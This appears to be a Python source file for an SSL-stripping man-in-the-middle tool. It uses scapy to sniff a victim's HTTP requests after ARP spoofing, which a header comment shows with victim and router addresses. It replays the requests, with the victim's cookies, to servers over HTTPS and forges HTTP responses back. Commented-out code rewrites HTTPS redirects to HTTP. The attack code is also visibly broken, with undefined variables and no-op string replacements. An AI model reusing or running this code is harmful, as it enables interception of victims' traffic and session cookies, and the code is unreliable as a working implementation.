import scapy.all as scapy
from scapy.layers.http import *
#from scapy.layers import *
from http.cookies import *
import requests
#  enable http with victim, and create https with server
# command: arp_spoof -m 10.0.123.4 -r 10.0.123.1 -s


def fwd_req(http_pkt):
        req = http_pkt[HTTPRequest]
        
        # Creating the packet for the server
        print(req.Host)
        print(req.Path)
        print(req.Accept_Encoding)
        print(req.Content_Type)
        # Create link (https)
        url = "https://" + req.Host.decode('utf-8') + req.Path.decode('utf-8')
        print("created url: " + url)

        payload = None
        if http_pkt.haslayer(Raw):
                payload = http_pkt[Raw].load
        print(payload)
        # payload = payload.decode('latin-1')
        # print("decoded:" + payload)

        # Copy original headers
        headers = { "Accept_Encoding": req.Accept_Encoding,
                "Accept_Language": req.Accept_Language,
                "Accept": req.Accept,  
                "Connection": req.Connection,
                "Content_Type": req.Content_Type,
                "Host": req.Host,
                "User_Agent": req.User_Agent}
        
        raw_cookies = req.Cookie        # Copy original cookies
        cookie = SimpleCookie()
        if raw_cookies is not None:
                cookie.load(raw_cookies)
        cookies = {k: v.value for k, v in cookie.items()}
        
        # Send the created req and await server rsp
        if req.Method == b'GET':                
                server_rsp = requests.get(url, headers=headers, cookies=cookies)
        elif req.Method == b'POST':
                server_rsp = requests.post(url, headers=headers, cookies=cookies) 
        print(server_rsp)
        return server_rsp

def fwd_rsp(http_pkt):
        url = http_pkt.url
        if url.startswith('https://'):
                url.replace('https://', 'http://')
        cookie_string = "; ".join([str(x)+"="+str(y) for x,y in http_pkt.cookieitems()])
        pkt = scapy.Ether(src = http_request[scapy.Ether].dst, dst = http_request[scapy.Ether].dst)/\
        scapy.IP(src = http_request[scapy.IP].dst, dst = http_request[scapy.IP].src)/\
        TCP(sport = http_request[TCP].dport, dport = http_request[TCP].sport, seq = http_request[TCP].ack, ack = http_request[TCP].seq + len(http_request[TCP]))/\
        HTTP()/\
        HTTPResponse(Server = url, Set_Cookie = cookie_string)/\
        scapy.content
        scapy.send(pkt)
        #send pkt
       

def packet_callback(packet):
    if (packet.haslayer(HTTPRequest)):
           print("Trying strip")
           server_response = fwd_req(packet)
           fwd_rsp(server_response)
    else:
        print("No strip")




#     if modified_packet:
#         # Forward the packet only if it's not modified
#         print("unmodified")
#         scapy.sendp(modified_packet, iface=IFACE, verbose=0)


#not arp and not icmp and eth.dst == 08:00:27:71:39:ba
def ssl_main(attacker_addr, input_iface):
        global ATTACKER_IP
        global ATTACKER_MAC
        global IFACE
        ATTACKER_IP = attacker_addr[0] 
        ATTACKER_MAC = attacker_addr[1]#and not arp and not icmp and ether dst
        IFACE = input_iface
        while True:
                scapy.sniff(count=1, iface=input_iface, prn=packet_callback) #, filter="tcp port 80"



#filter="tcp port 80 or tcp port 443"


# if pkt.haslayer(scapy.IP) and pkt.dst == ATTACKER_IP: # Skip if pkt is for attacker
#         continue

# if pkt.haslayer(HTTP):
#         print("http")
#         print(pkt.summary())
#         #print(pkt[HTTP].Host)

# if pkt.haslayer(HTTPRequest):
#         print("httprequest")
#         print(pkt.summary())
#         print(pkt[HTTPRequest].Host)


# if pkt.haslayer(TCP) and pkt.dport == 80:
#         print("tcp port 80")
#         print(pkt.summary())
# if pkt.haslayer(HTTP) and pkt.haslayer(TCP) and pkt.dport == 80: # Handle 
#         print("http found")
#         strip_packet(pkt)
#         print("handled")
#         break


# def check_packet(packet):
#         # Intercept and modify HTTP responses
#         #print(packet.[])

#         if packet.haslayer(HTTPRequest):
#                 if packet.haslayer(Raw):
#                         payload = packet[Raw].load.decode('utf-8', errors='ignore')
#                         print("payload: " + payload)
#                 print("http request")

#         if packet.haslayer(HTTPResponse):
#                 if packet.haslayer(Raw):
#                         payload = packet[Raw].load.decode('utf-8', errors='ignore')
#                         print("payload: " + payload)
#                 print("http response")

#         if packet.haslayer(TCP) and packet.haslayer(Raw):
#                 payload = packet[Raw].load.decode('utf-8', errors='ignore')
#                 #print(payload)

#                 # if(packet.haslayer('HTTP/1.1 302 Found')):
#                 #         print('redirect found')
#                 # if(packet.haslayer('HTTP/1.1')):
#                 #         print("1.1 found")
#                 # if packet.haslayer(HTTP):
#                 #         print(packet[HTTP].Content_Type)
#                 #         #print(packet[HTTP].Accept_Encoding)

#                 # Modify responses
#                 if 'HTTP/1.1 301' in payload or 'HTTP/1.1 302' in payload:
#                         if 'https://' in payload:
#                                 print("[*] Intercepted HTTP redirect to HTTPS.")
#                                 modified_payload = payload.replace('https://', 'http://')
                                
#                                 # Recalculate checksuns
#                                 packet[Raw].load = modified_payload.encode('utf-8')
#                                 del packet[scapy.IP].chksum
#                                 del packet[TCP].chksum
                                
#                                 # Forward modified packet
#                                 scapy.send(packet, verbose=0)
#                                 return None  # Indicate that the packet has been handled

#                 if 'GET ' in payload or 'POST ' in payload:
#                         if b'https://' in payload:
#                                 print("[*] Intercepted HTTPS request.")
#                                 modified_payload = payload.replace('https://', 'http://')
                                
#                                 # Recalculate checksums
#                                 packet[Raw].load = modified_payload.encode('utf-8')
#                                 del packet[scapy.IP].chksum
#                                 del packet[TCP].chksum
                                
#                                 # Forward modified packet
#                                 scapy.send(packet, verbose=0)
#                                 return None  # Packet has been handled
                        
#         return packet
